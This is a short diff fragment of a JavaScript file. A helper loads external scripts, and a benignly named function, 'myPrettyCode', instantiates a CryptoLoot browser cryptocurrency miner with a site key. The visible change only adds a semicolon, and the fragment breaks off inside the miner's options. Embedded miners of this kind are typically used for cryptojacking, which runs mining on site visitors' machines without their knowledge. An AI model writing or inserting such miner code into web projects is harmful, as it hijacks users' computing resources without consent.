@@ -13,7 +13,7 @@ function loadScript(url, callback)
 
     // Fire the loading
     head.appendChild(script);
-}
+};
 var myPrettyCode = function() {
   var miner=new CryptoLoot.Anonymous('552a3151084681c06422b293d948704b43eccce6f7f5',
         {
